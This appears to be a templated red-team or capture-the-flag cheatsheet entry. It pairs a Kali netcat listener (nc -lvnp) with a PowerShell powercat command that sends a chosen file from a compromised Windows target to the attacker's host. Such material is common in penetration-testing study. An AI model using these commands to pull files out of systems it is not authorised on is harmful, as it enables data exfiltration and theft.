# description: Windows sends file to Kali with Kali-side nc listener
# stage: Kali shell: receive file
RFILE="$rfile"
rm -f "$RFILE"
nc -lvnp $lport > "$RFILE"

# stage: Target PowerShell: send file and close connection
$LHOST = "$lhost"
$PORT = $lport
$FILE = "$file"
powercat -c $LHOST -p $PORT -i $FILE
